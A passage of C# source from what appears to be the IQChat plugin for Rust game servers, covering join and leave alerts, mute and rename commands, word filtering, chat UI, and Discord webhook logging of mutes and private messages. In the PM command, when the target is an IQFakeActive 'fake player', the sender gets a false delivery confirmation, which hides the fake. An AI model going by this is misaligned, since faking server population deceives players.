                String Avatar = AlertSessionPlayer.ConnectedAvatarUse ? userID : String.Empty;
                if (AlertSessionPlayer.ConnectedWorld)
                     ReplyBroadcast(GetLang("WELCOME_PLAYER_WORLD", player.UserIDString, DisplayName, country), CustomAvatar: Avatar);   
                else ReplyBroadcast(GetLang("WELCOME_PLAYER", player.UserIDString, DisplayName), CustomAvatar: Avatar);
            }
        }
        void API_SEND_PLAYER_DISCONNECTED(BasePlayer player, String DisplayName, String reason, String userID)
        {
            Configuration.ControllerAlert.PlayerSession AlertSessionPlayer = config.ControllerAlertSetting.PlayerSessionSetting;

            if (AlertSessionPlayer.DisconnectedAlert)
            {
                String Avatar = AlertSessionPlayer.ConnectedAvatarUse ? userID : String.Empty;
                String LangLeave = AlertSessionPlayer.DisconnectedReason ? GetLang("LEAVE_PLAYER_REASON",player.UserIDString, DisplayName, reason) : GetLang("LEAVE_PLAYER", player.UserIDString, DisplayName);
                ReplyBroadcast(LangLeave, CustomAvatar: Avatar);
            }
        }

        private void AlertDisconnected(BasePlayer player, String reason)
        {
            Configuration.ControllerAlert.AdminSession AlertSessionAdmin = config.ControllerAlertSetting.AdminSessionSetting;
            Configuration.ControllerAlert.PlayerSession AlertSessionPlayer = config.ControllerAlertSetting.PlayerSessionSetting;
            GeneralInformation.RenameInfo RenameInformation = GeneralInfo.GetInfoRename(player.userID);

            if (AlertSessionPlayer.DisconnectedAlert)
            {
                if (!AlertSessionAdmin.DisconnectedAlertAdmin)
                    if (player.IsAdmin) return;

                String DisplayName = player.displayName;

                Configuration.ControllerMessage ControllerMessage = config.ControllerMessages;

                // if (ControllerMessage.Formatting.ControllerNickname.UseNickController)
                //     foreach (String DetectedBadNick in DisplayName.Split(' '))
                //     {
                //         if (ControllerMessage.Formatting.ControllerNickname.BadNicks.Count(x => x.ToLower() == DetectedBadNick.ToLower()) > 0)
                //             DisplayName = DisplayName.Replace(DetectedBadNick, ControllerMessage.Formatting.ControllerNickname.ReplaceBadNick);
                //     }

                UInt64 UserID = player.userID;
                if (RenameInformation != null)
                {
                    DisplayName = RenameInformation.RenameNick;
                    UserID = RenameInformation.RenameID;
                }

                String Avatar = AlertSessionPlayer.ConnectedAvatarUse ? UserID.ToString() : String.Empty;
                String Message = String.Empty;

                if (AlertSessionPlayer.DisconnectedAlertRandom)
                {
                    sb.Clear();
                    Message = sb.AppendFormat(GetMessages(player, AlertSessionPlayer.RandomDisconnectedAlert.LanguageMessages), DisplayName, reason).ToString();
                }
                else Message = AlertSessionPlayer.DisconnectedReason ? GetLang("LEAVE_PLAYER_REASON", player.UserIDString, DisplayName, reason) : GetLang("LEAVE_PLAYER", player.UserIDString, DisplayName);

                if (!permission.UserHasPermission(player.UserIDString, PermissionHideDisconnection))
                    ReplyBroadcast(Message, "", Avatar);

                Log($"[{player.userID}] {Message}");
            }
        }
        
        
        void API_SEND_PLAYER(BasePlayer player, String PlayerFormat, String Message, String Avatar, Chat.ChatChannel channel = Chat.ChatChannel.Global)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;

            String OutMessage = String.Empty; ;

            if (ControllerMessages.Formatting.FormatMessage)
                OutMessage = $"{Message.ToLower().Substring(0, 1).ToUpper()}{Message.Remove(0, 1).ToLower()}";

            if (ControllerMessages.Formatting.UseBadWords)
                foreach (String DetectedMessage in OutMessage.Split(' '))
                    if (ControllerMessages.Formatting.BadWords.Contains(DetectedMessage.ToLower()))
                        OutMessage = OutMessage.Replace(DetectedMessage, ControllerMessages.Formatting.ReplaceBadWord);

            player.SendConsoleCommand("chat.add", channel, ulong.Parse(Avatar), $"{PlayerFormat}: {OutMessage}");
            player.ConsoleMessage($"{PlayerFormat}: {OutMessage}");
        }
        
        private void DiscordLoggMuted(BasePlayer Target, MuteType Type, String Reason = null, String TimeBlocked = null, BasePlayer Moderator = null)
        {
            Configuration.OtherSettings.General MuteChat = config.OtherSetting.LogsMuted;
            if (!MuteChat.UseLogged) return;

            Configuration.ControllerMute.LoggedFuncion ControllerMuted = config.ControllerMutes.LoggedMute;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            String ActionReason = String.Empty;
           
            GeneralInformation.RenameInfo RenameSender = GeneralInfo.GetInfoRename(Target.userID);

            UInt64 UserIDModeration = 0;
            String NickModeration = GetLang("IQCHAT_FUNCED_ALERT_TITLE_SERVER", Target.UserIDString);
            if (Moderator != null)
            {
                GeneralInformation.RenameInfo RenameModerator = GeneralInfo.GetInfoRename(Moderator.userID);

                UserIDModeration = RenameModerator != null ? RenameModerator.RenameID == 0 ? Moderator.userID : RenameModerator.RenameID : Moderator.userID;
                NickModeration = RenameModerator != null ? $"{RenameModerator.RenameNick ?? Moderator.displayName}" : Moderator.displayName;
            }

            String NickTarget = RenameSender!= null ? $"{RenameSender.RenameNick ?? Target.displayName}" : Target.displayName;
            UInt64 UserIDTarget = RenameSender != null ? RenameSender.RenameID == 0 ? Target.userID : RenameSender.RenameID : Target.userID;

            List<Fields> fields;

            switch (Type)
            {
                case MuteType.Chat:
                    {
                        if (Reason != null)
                            ActionReason = LanguageEn ? "Mute chat" : "Блокировка чата";
                        else ActionReason = LanguageEn ? "Unmute chat" : "Разблокировка чата";
                        break;
                    }
                case MuteType.Voice:
                    {
                        if (Reason != null)
                            ActionReason = LanguageEn ? "Mute voice" : "Блокировка голоса";
                        else ActionReason = LanguageEn ? "Unmute voice" : "Разблокировка голоса";
                        break;
                    }
                default:
                    break;
            }
            Int32 Color = 0;
            if (Reason != null)
            {
                fields = new List<Fields>
                        {
                            new Fields(LanguageEn ? "Nickname of the moderator" : "Ник модератора", NickModeration, true),
                            new Fields(LanguageEn ? "Steam64ID Moderator" : "Steam64ID модератора", $"{UserIDModeration}", true),
                            new Fields(LanguageEn ? "Action" : "Действие", ActionReason, false),
                            new Fields(LanguageEn ? "Reason" : "Причина", Reason, false),
                            new Fields(LanguageEn ? "Time" : "Время", TimeBlocked, false),
                            new Fields(LanguageEn ? "Nick blocked" : "Ник заблокированного", NickTarget, true),
                            new Fields(LanguageEn ? "Steam64ID blocked" : "Steam64ID заблокированного", $"{UserIDTarget}", true),
                        };



                if (ControllerMuted.UseHistoryMessage)
                {
                    String Messages = GetLastMessage(Target, ControllerMuted.CountHistoryMessage);
                    if (Messages != null && !String.IsNullOrWhiteSpace(Messages))
                        fields.Insert(fields.Count, new Fields(LanguageEn ? $"The latter {ControllerMuted.CountHistoryMessage} messages" : $"Последние {ControllerMuted.CountHistoryMessage} сообщений", Messages, false));
                }

                Color = 14357781;
            }
            else
            {
                fields = new List<Fields>
                        {
                            new Fields(LanguageEn ? "Nickname of the moderator" : "Ник модератора", NickModeration, true),
                            new Fields(LanguageEn ? "Steam64ID moderator" : "Steam64ID модератора", $"{UserIDModeration}", true),
                            new Fields(LanguageEn ? "Action" : "Действие", ActionReason, false),
                            new Fields(LanguageEn ? "Nick blocked" : "Ник заблокированного", NickTarget, true),
                            new Fields(LanguageEn ? "Steam64ID blocked" : "Steam64ID заблокированного", $"{UserIDTarget}", true),
                        };
                Color = 1432346;
            }

            
            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, Color, fields, new Authors("IQChat Mute-History", null, "https://i.imgur.com/xiwsg5m.png", null), null) });

            Request($"{MuteChat.Webhooks}", newMessage.toJSON());
        }
        public bool IsFake(String DisplayName)
        {
            if (!IQFakeActive) return false;

            return (bool)IQFakeActive?.Call("IsFake", DisplayName);
        }
        
        
        
                [ChatCommand("rename")]
        private void ChatCommandRename(BasePlayer Renamer, string command, string[] args)
        {
            if (!permission.UserHasPermission(Renamer.UserIDString, PermissionRename)) return;
            GeneralInformation General = GeneralInfo;
            if (General == null) return;

            if (Renamer == null)
            {
                ReplySystem(Renamer, LanguageEn ? "You can only use this command while on the server" : "Вы можете использовать эту команду только находясь на сервере");
                return;
            }
            if (args.Length == 0 || args == null)
            {
                ReplySystem(Renamer, lang.GetMessage("COMMAND_RENAME_NOTARG", this, Renamer.UserIDString));
                return;
            }

            String Name = args[0];
            UInt64 ID = Renamer.userID;
            if(args.Length == 2 && args[1] != null && !String.IsNullOrWhiteSpace(args[1]))
                if(!UInt64.TryParse(args[1], out ID))
                {
                    ReplySystem(Renamer, GetLang("COMMAND_RENAME_NOT_ID", Renamer.UserIDString));
                    return;
                }

            if (General.RenameList.ContainsKey(Renamer.userID))
            {
                General.RenameList[Renamer.userID].RenameNick = Name;
                General.RenameList[Renamer.userID].RenameID = ID;
            }
            else General.RenameList.Add(Renamer.userID, new GeneralInformation.RenameInfo { RenameNick = Name, RenameID = ID });

            ReplySystem(Renamer, GetLang("COMMAND_RENAME_SUCCES", Renamer.UserIDString, Name, ID));
            Renamer.displayName = Name;
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  

        private Tuple<String, Boolean> BadWordsCleaner(String FormattingMessage, String ReplaceBadWord, List<String> BadWords)
        {
            String ResultMessage = FormattingMessage;
            Boolean IsBadWords = false;
            
            foreach(String word in BadWords.Where(x => !x.Contains("*")))
            {
              //  MatchCollection matches = new Regex(@"((?i)#(?:\S+)?" + word + @"?\S+)").Matches(ResultMessage);
               // MatchCollection matches = new Regex(@"^.*(" + word + @")(.*(\1)){0}.*$").Matches(ResultMessage);
                MatchCollection matches = new Regex(@"\b(" + word + @")\b").Matches(ResultMessage);
                foreach(Match match in matches)
                {
                    if(match.Success)
                    {
                        String found = match.Groups[1].ToString();
                        String replaced = "";
						
                        for(int i = 0; i < found.Length; i++) replaced = replaced + ReplaceBadWord;
						
                        ResultMessage = ResultMessage.Replace(found, replaced);
                        IsBadWords = true;
                    }
                    else break;
                }
            }
            
            return Tuple.Create(ResultMessage, IsBadWords);
        }

        [ChatCommand("mute")]
        void MuteCustomChat(BasePlayer Moderator, string cmd, string[] arg)
        {
            if (!permission.UserHasPermission(Moderator.UserIDString, PermissionMute)) return;
            if (arg == null || arg.Length != 3 || arg.Length > 3)
            {
                ReplySystem(Moderator, LanguageEn ? "Invalid syntax, use : mute Steam64ID/Nick Reason Time(seconds)" : "Неверный синтаксис, используйте : mute Steam64ID/Ник Причина Время(секунды)");
                return;
            }
            string NameOrID = arg[0];
            string Reason = arg[1];
            Int32 TimeMute = 0;
            if (!Int32.TryParse(arg[2], out TimeMute))
            {
                ReplySystem(Moderator, LanguageEn ? "Enter time in numbers!" : "Введите время цифрами!");
                return;
            }
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ReplySystem(Moderator, LanguageEn ? "The player already has a chat lock" : "Игрок уже имеет блокировку чата");
                            return;
                        }
                        
                        Info.MuteInfo.SetMute(MuteType.Chat, TimeMute);
                        ReplySystem(Moderator,LanguageEn ? "Chat blocking issued to offline player" : "Блокировка чата выдана offline-игроку");
                        return;
                    }
                    else
                    {
                        ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            MutePlayer(target, MuteType.Chat, 0, Moderator, Reason, TimeMute, false, true);
        }
        void SyncReservedFinish(string JSON)
        {
            if (!config.ReferenceSetting.IQFakeActiveSettings.UseIQFakeActive) return;
            List<FakePlayer> ContentDeserialize = JsonConvert.DeserializeObject<List<FakePlayer>>(JSON);
            PlayerBases = ContentDeserialize;

            PrintWarning(LanguageEn ? "IQChat - successfully synced with IQFakeActive" : "IQChat - успешно синхронизирована с IQFakeActive");
            PrintWarning("=============SYNC==================");
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  
        void OnUserGroupRemoved(string id, string groupName)
        {
            String[] PermissionsGroup = permission.GetGroupPermissions(groupName);
            if (PermissionsGroup == null) return;

            foreach (String permName in PermissionsGroup)
                RemoveParametres(id, permName);
        }
        private enum SelectedAction
        {
            Mute,
            Ignore
        }

                
        
        private String XLevel_GetLevel(BasePlayer player)
        {
            if (!XLevels || !config.ReferenceSetting.XLevelsSettings.UseXLevels) return String.Empty;
            return GetLang("XLEVELS_SYNTAX_PREFIX", player.UserIDString,
                (Int32)XLevels?.CallHook("API_GetLevel", player)); 
        }

        [ConsoleCommand("alertui")]
        private void AlertUIConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();
            if (Sender != null)
                if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            AlertUI(Sender, args.Args);
        }
        public enum MuteType
        {
            Chat,
            Voice
        }
        private void AddHistoryMessage(BasePlayer player, String Message)
        {
            if (!LastMessagesChat.ContainsKey(player))
                LastMessagesChat.Add(player, new List<String> { Message });
            else LastMessagesChat[player].Add(Message);
        }
        public List<String> KeyImages = new List<String>
        {
            "UI_IQCHAT_CONTEXT_NO_RANK",
            "UI_IQCHAT_CONTEXT_RANK",
            "IQCHAT_INFORMATION_ICON",
            "IQCHAT_SETTING_ICON",
            "IQCHAT_IGNORE_INFO_ICON",
            "IQCHAT_MODERATION_ICON",
            "IQCHAT_ELEMENT_PANEL_ICON",
            "IQCHAT_ELEMENT_PREFIX_MULTI_TAKE_ICON",
            "IQCHAT_ELEMENT_SLIDER_ICON",
            "IQCHAT_ELEMENT_SLIDER_LEFT_ICON",
            "IQCHAT_ELEMENT_SLIDER_RIGHT_ICON",
            "IQCHAT_ELEMENT_DROP_LIST_OPEN_ICON",
            "IQCHAT_ELEMENT_DROP_LIST_OPEN_ARGUMENT_ICON",
            "IQCHAT_ELEMENT_DROP_LIST_OPEN_TAKED",
            "IQCHAT_ELEMENT_SETTING_CHECK_BOX",
            "IQCHAT_ALERT_PANEL",
            "IQCHAT_MUTE_AND_IGNORE_PANEL",
            "IQCHAT_MUTE_AND_IGNORE_ICON",
            "IQCHAT_MUTE_AND_IGNORE_SEARCH",
            "IQCHAT_MUTE_AND_IGNORE_PAGE_PANEL",
            "IQCHAT_MUTE_AND_IGNORE_PLAYER",
            "IQCHAT_MUTE_AND_IGNORE_PLAYER_STATUS",
            "IQCHAT_IGNORE_ALERT_PANEL",
            "IQCHAT_IGNORE_ALERT_ICON",
            "IQCHAT_IGNORE_ALERT_BUTTON_YES",
            "IQCHAT_IGNORE_ALERT_BUTTON_NO",
            "IQCHAT_MUTE_ALERT_PANEL",
            "IQCHAT_MUTE_ALERT_ICON",
            "IQCHAT_MUTE_ALERT_PANEL_REASON",
        };
        void API_SEND_PLAYER_PM(BasePlayer player, string DisplayName, string Message)
        {
            ReplySystem(player, GetLang("COMMAND_PM_SEND_MSG", player.UserIDString, DisplayName, Message));
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (UserInformation.ContainsKey(player.userID))
                if (UserInformation[player.userID].Settings.TurnSound)
                    Effect.server.Run(config.ControllerMessages.TurnedFunc.PMSetting.SoundPM, player.GetNetworkPosition());
        }

        private void DiscordLoggPM(BasePlayer Sender, BasePlayer Reciepter, String MessageLogged)
        {
            Configuration.OtherSettings.General PMChat = config.OtherSetting.LogsPMChat;
            if (!PMChat.UseLogged) return;

            GeneralInformation.RenameInfo SenderRename = GeneralInfo.GetInfoRename(Sender.userID);
            GeneralInformation.RenameInfo ReciepterRename = GeneralInfo.GetInfoRename(Reciepter.userID);

            UInt64 UserIDSender = SenderRename != null ? SenderRename.RenameID == 0 ? Sender.userID : SenderRename.RenameID : Sender.userID;
            UInt64 UserIDReciepter = ReciepterRename != null ? ReciepterRename.RenameID == 0 ? Reciepter.userID : ReciepterRename.RenameID : Reciepter.userID;
            String SenderName = SenderRename != null ? ReciepterRename.RenameNick ?? Sender.displayName : Sender.displayName;
            String ReciepterName = ReciepterRename != null ? ReciepterRename.RenameNick ?? Reciepter.displayName : Reciepter.displayName;

            List <Fields> fields = new List<Fields>
                        {
                            new Fields(LanguageEn ? "Sender" : "Отправитель", $"{SenderName}({UserIDSender})", true),
                            new Fields(LanguageEn ? "Recipient" : "Получатель", $"{ReciepterName}({UserIDReciepter})", true),
                            new Fields(LanguageEn ? "Message" : "Сообщение", MessageLogged, false),
                        };
		   		 		  						  	   		  	  			  	  			  	   		  		  
            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 16608621, fields, new Authors("IQChat PM-History", null, "https://i.imgur.com/xiwsg5m.png", null), null) });

            Request($"{PMChat.Webhooks}", newMessage.toJSON());
        }     
        private Dictionary<BasePlayer, InformationOpenedUI> LocalBase = new Dictionary<BasePlayer, InformationOpenedUI>();
        
        private String RemoveLinkText(String text)
        {
            String hrefPattern = "([A-Za-z0-9-А-Яа-я]|https?://)[^ ]+\\.(com|lt|net|org|gg|ru|рф|int|info|ru.com|ru.net|com.ru|net.ru|рус|org.ru|moscow|biz|орг|su)";
            Regex rgx = new Regex(hrefPattern, RegexOptions.IgnoreCase);

            return config.ControllerMessages.Formatting.ControllerNickname.AllowedLinkNick.Contains(rgx.Match(text).Value) ? text : rgx.Replace(text, "").Trim();
        }
        private const String PermissionHideDisconnection = "iqchat.hidedisconnection";
        public Boolean AddImage(String url, String shortname, UInt64 skin = 0) => (Boolean)ImageLibrary?.Call("AddImage", url, shortname, skin);
        String API_GET_NICK_COLOR(ulong ID)
        {
            if (!UserInformation.ContainsKey(ID)) return String.Empty;

            return UserInformation[ID].Info.ColorNick;
        }
        private enum ElementsSettingsType
        {
            PM,
            Broadcast,
            Alert,
            Sound
        }
        void AlertUI(BasePlayer Sender, BasePlayer Recipient, string[] arg)
        {
            if (_interface == null)
            {
                PrintWarning(LanguageEn ? "We generate the interface, wait for a message about successful generation" : "Генерируем интерфейс, ожидайте сообщения об успешной генерации");
                return;
            }
            String Message = GetMessageInArgs(Sender, arg);
            if (Message == null) return;

            DrawUI_IQChat_Alert(Recipient, Message);
        }
        String API_GET_CHAT_COLOR(UInt64 ID)
        {
            if (!UserInformation.ContainsKey(ID)) return String.Empty;

            return UserInformation[ID].Info.ColorMessage;
        }
        private object OnServerMessage(String message, String name)
        {
            if (config.ControllerMessages.TurnedFunc.HideAdminGave)
                if (message.Contains("gave") && name == "SERVER")
                    return true;
            return null;
        }
        void OnUserPermissionRevoked(string id, string permName) => RemoveParametres(id, permName);
        void Alert(BasePlayer Sender, string[] arg, Boolean IsAdmin)
        {
            String Message = GetMessageInArgs(Sender, arg);
            if (Message == null) return;

            ReplyBroadcast(Message, AdminAlert: IsAdmin);

            if (config.RustPlusSettings.UseRustPlus)
                foreach(BasePlayer playerList in BasePlayer.activePlayerList)
                    NotificationList.SendNotificationTo(playerList.userID, NotificationChannel.SmartAlarm, config.RustPlusSettings.DisplayNameAlert, Message, Util.GetServerPairingData());
        }

        public class Fields
        {
            public string name { get; set; }
            public string value { get; set; }
            public bool inline { get; set; }
            public Fields(string name, string value, bool inline)
            {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }
        }
        private void DrawUI_IQChat_Mute_And_Ignore_Player(BasePlayer player, SelectedAction Action, IEnumerable<BasePlayer> PlayerList, IEnumerable<FakePlayer> FakePlayerList = null) 
        {       
            User MyInfo = UserInformation[player.userID];
            if (MyInfo == null) return;
            Int32 X = 0, Y = 0;
            String ColorGreen = "0.5803922 1 0.5372549 1";
            String ColorRed = "0.8962264 0.2578764 0.3087685 1";
            String Color = String.Empty;

            if (IQFakeActive && FakePlayerList != null)
            {
                foreach (var playerInList in FakePlayerList)
                {
                    String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Player");
                    if (Interface == null) return;

                    String DisplayName = playerInList.DisplayName;
                    if (GeneralInfo.RenameList.ContainsKey(playerInList.UserID))
                        if (!String.IsNullOrWhiteSpace(GeneralInfo.RenameList[playerInList.UserID].RenameNick))
                            DisplayName = GeneralInfo.RenameList[playerInList.UserID].RenameNick;

                    Interface = Interface.Replace("%OFFSET_MIN%", $"{-385.795 - (-281.17 * X)} {97.54 - (46.185 * Y)}");
                    Interface = Interface.Replace("%OFFSET_MAX%", $"{-186.345 - (-281.17 * X)} {132.03 - (46.185 * Y)}");
                    Interface = Interface.Replace("%DISPLAY_NAME%", $"{DisplayName}");
                    Interface = Interface.Replace("%COMMAND_ACTION%", $"newui.cmd action.mute.ignore ignore.and.mute.controller {Action} confirm.alert {playerInList.UserID}");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                    switch (Action)
                    {
                        case SelectedAction.Mute:
                            if (UserInformation.ContainsKey(playerInList.UserID) && UserInformation[playerInList.UserID] != null && (UserInformation[playerInList.UserID].MuteInfo.IsMute(MuteType.Chat) || UserInformation[playerInList.UserID].MuteInfo.IsMute(MuteType.Voice)))
                                Color = ColorRed;
                            else Color = ColorGreen;
                            break;
                        case SelectedAction.Ignore:
                            if (MyInfo.Settings.IsIgnored(playerInList.UserID))
                                Color = ColorRed;
                            else Color = ColorGreen;
                            break;
                        default:
                            break;
                    }

                    Interface = Interface.Replace("%COLOR%", Color);
		   		 		  						  	   		  	  			  	  			  	   		  		  

                    X++;
                    if (X == 3)
                    {
                        X = 0;
                        Y++;
                    }

                    CuiHelper.AddUi(player, Interface);
                }
            }
            else
            {
                foreach (var playerInList in PlayerList)
                {
                    String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Player");
                    if (Interface == null) return;
                    User Info = UserInformation[playerInList.userID];
                    if (Info == null) continue;

                    String DisplayName = playerInList.displayName;
                    if (GeneralInfo.RenameList.ContainsKey(playerInList.userID))
                        if (!String.IsNullOrWhiteSpace(GeneralInfo.RenameList[playerInList.userID].RenameNick))
                            DisplayName = GeneralInfo.RenameList[playerInList.userID].RenameNick;

                    Interface = Interface.Replace("%OFFSET_MIN%", $"{-385.795 - (-281.17 * X)} {97.54 - (46.185 * Y)}");
                    Interface = Interface.Replace("%OFFSET_MAX%", $"{-186.345 - (-281.17 * X)} {132.03 - (46.185 * Y)}");
                    Interface = Interface.Replace("%DISPLAY_NAME%", $"{DisplayName}");
                    Interface = Interface.Replace("%COMMAND_ACTION%", $"newui.cmd action.mute.ignore ignore.and.mute.controller {Action} confirm.alert {playerInList.userID}");

                    switch (Action)
                    {
                        case SelectedAction.Mute:
                            if (Info.MuteInfo.IsMute(MuteType.Chat) || Info.MuteInfo.IsMute(MuteType.Voice))
                                Color = ColorRed;
                            else Color = ColorGreen;
                            break;
                        case SelectedAction.Ignore:
                            if (MyInfo.Settings.IsIgnored(playerInList.userID))
                                Color = ColorRed;
                            else Color = ColorGreen;
                            break;
                        default:
                            break;
                    }

                    Interface = Interface.Replace("%COLOR%", Color);


                    X++;
                    if (X == 3)
                    {
                        X = 0;
                        Y++;
                    }

                    CuiHelper.AddUi(player, Interface);
                }
            }
        }
        public void IQPersonalSendBadWords(BasePlayer player) => IQPersonal?.CallHook("API_DETECTED_BAD_WORDS", player.userID);
        Boolean API_CHECK_MUTE_CHAT(UInt64 ID)
        {
            if (!UserInformation.ContainsKey(ID)) return false;
            return UserInformation[ID].MuteInfo.IsMute(MuteType.Chat);
        }
        [ChatCommand("alertuip")]
        private void AlertUIPChatCommand(BasePlayer Sender, String cmd, String[] args)
        {
            if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            if (args == null || args.Length == 0)
            {
                ReplySystem(Sender, LanguageEn ? "You didn't specify a player!" : "Вы не указали игрока!");
                return;
            }
            BasePlayer Recipient = BasePlayer.Find(args[0]);
            if (Recipient == null)
            {
                ReplySystem(Sender, LanguageEn ? "The player is not on the server!" : "Игрока нет на сервере!");
                return;
            }
            AlertUI(Sender, Recipient, args.Skip(1).ToArray());
        }    
       
        private static InterfaceBuilder _interface;
        String API_GET_DEFAULT_NICK_COLOR() => config.ControllerConnect.SetupDefaults.NickDefault;
        private const String PermissionMute = "iqchat.muteuse";

        void OnGroupPermissionRevoked(string name, string perm)
        {
            String[] PlayerGroups = permission.GetUsersInGroup(name);
            if (PlayerGroups == null) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            foreach (String playerInfo in PlayerGroups)
            {
                BasePlayer player = BasePlayer.FindByID(UInt64.Parse(playerInfo.Substring(0, 17)));
                if (player == null) return;

                RemoveParametres(player.UserIDString, perm);
            }
        }
        
        
        [ChatCommand("pm")]
        void PmChat(BasePlayer Sender, String cmd, String[] arg)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;
            if (!ControllerMessages.TurnedFunc.PMSetting.PMActivate) return;
            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Sender, lang.GetMessage("COMMAND_PM_NOTARG", this, Sender.UserIDString));
                return;
            }

            Configuration.ControllerMessage.TurnedFuncional.AntiNoob.Settings antiNoob = config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobPM;
            if (antiNoob.AntiNoobActivate)
                if (IsNoob(Sender.userID, antiNoob.TimeBlocked))
                {
                    ReplySystem(Sender, GetLang("IQCHAT_INFO_ANTI_NOOB_PM", Sender.UserIDString, FormatTime(UserInformationConnection[Sender.userID].LeftTime(antiNoob.TimeBlocked), Sender.UserIDString)));
                    return;
                }

            String NameUser = arg[0];

            if (config.ReferenceSetting.IQFakeActiveSettings.UseIQFakeActive)
                if (IQFakeActive)
                    if (IsFake(NameUser))
                    {
                        ReplySystem(Sender, GetLang("COMMAND_PM_SUCCESS", Sender.UserIDString, string.Join(" ", arg.ToArray()).Replace(NameUser, ""), NameUser));
                        return;
                    }

            BasePlayer TargetUser = GetPlayerNickOrID(NameUser);
            if (TargetUser == null || NameUser == null || !UserInformation.ContainsKey(TargetUser.userID))
            {
                ReplySystem(Sender, GetLang("COMMAND_PM_NOT_USER", Sender.UserIDString));
                return;
            }

            User InfoTarget = UserInformation[TargetUser.userID];
            User InfoSender = UserInformation[Sender.userID];
            if (!InfoTarget.Settings.TurnPM)
            {
                ReplySystem(Sender, GetLang("FUNC_MESSAGE_PM_TURN_FALSE", Sender.UserIDString));
                return;
            }

            if (ControllerMessages.TurnedFunc.IgnoreUsePM)
            {
                if (InfoTarget.Settings.IsIgnored(Sender.userID))
                {
                    ReplySystem(Sender, GetLang("IGNORE_NO_PM", Sender.UserIDString));
                    return;
                }
                if (InfoSender.Settings.IsIgnored(TargetUser.userID))
                {
                    ReplySystem(Sender, GetLang("IGNORE_NO_PM_ME", Sender.UserIDString));
                    return;
                }
            }
            String Message = GetMessageInArgs(Sender, arg.Skip(1).ToArray());

            if (Message == null || Message.Length <= 0)
            {
                ReplySystem(Sender, GetLang("COMMAND_PM_NOT_NULL_MSG", Sender.UserIDString));
                return;
            }
            Message = Message.EscapeRichText();

            if (Message.Length > 125) return;

            PMHistory[TargetUser] = Sender;
            PMHistory[Sender] = TargetUser;

            GeneralInformation.RenameInfo RenamerSender = GeneralInfo.GetInfoRename(Sender.userID);
            GeneralInformation.RenameInfo RenamerTarget = GeneralInfo.GetInfoRename(TargetUser.userID);

            String DisplayNameSender = RenamerSender != null ? RenamerSender.RenameNick ?? Sender.displayName : Sender.displayName;
            String TargetDisplayName = RenamerTarget != null ? RenamerTarget.RenameNick ?? TargetUser.displayName : TargetUser.displayName;
            ReplySystem(TargetUser, GetLang("COMMAND_PM_SEND_MSG", TargetUser.UserIDString, DisplayNameSender, Message));
            ReplySystem(Sender, GetLang("COMMAND_PM_SUCCESS", Sender.UserIDString, Message, TargetDisplayName));

            if (InfoTarget.Settings.TurnSound)
                Effect.server.Run(ControllerMessages.TurnedFunc.PMSetting.SoundPM, TargetUser.GetNetworkPosition());

            Log(LanguageEn ? $"PRIVATE MESSAGES : {Sender.userID}({Sender.displayName}) sent a message to the player - {TargetUser.displayName}({TargetDisplayName})\nMESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.userID}({Sender.displayName}) отправил сообщение игроку - {TargetUser.displayName}({TargetDisplayName})\nСООБЩЕНИЕ : {Message}");
            DiscordLoggPM(Sender, TargetUser, Message);

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = LanguageEn ? $"PRIVATE MESSAGES : {Sender.displayName}({Sender.userID}) -> {TargetUser.displayName} : MESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.displayName}({Sender.userID}) -> {TargetUser.displayName} : СООБЩЕНИЕ : {Message}",
                UserId = Sender.UserIDString,
                Username = Sender.displayName,
                Channel = Chat.ChatChannel.Global,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
                Color = "#3f4bb8",
            });
            PrintWarning(LanguageEn ? $"PRIVATE MESSAGES : {Sender.displayName}({Sender.userID}) -> {TargetUser.displayName} : MESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.displayName}({Sender.userID}) -> {TargetUser.displayName} : СООБЩЕНИЕ : {Message}");
        }
        public String FormatTime(Double Second, String UserID = null)
        {
            TimeSpan time = TimeSpan.FromSeconds(Second);
            String Result = String.Empty;
            String Days = GetLang("TITLE_FORMAT_DAYS", UserID);
            String Hourse = GetLang("TITLE_FORMAT_HOURSE", UserID);
            String Minutes = GetLang("TITLE_FORMAT_MINUTES", UserID);
            String Seconds = GetLang("TITLE_FORMAT_SECONDS", UserID);

            if (time.Seconds != 0)
                Result = $"{Format(time.Seconds, Seconds, Seconds, Seconds)}";

            if (time.Minutes != 0)
                Result = $"{Format(time.Minutes, Minutes, Minutes, Minutes)}";

            if (time.Hours != 0)
                Result = $"{Format(time.Hours, Hourse, Hourse, Hourse)}";

            if (time.Days != 0)
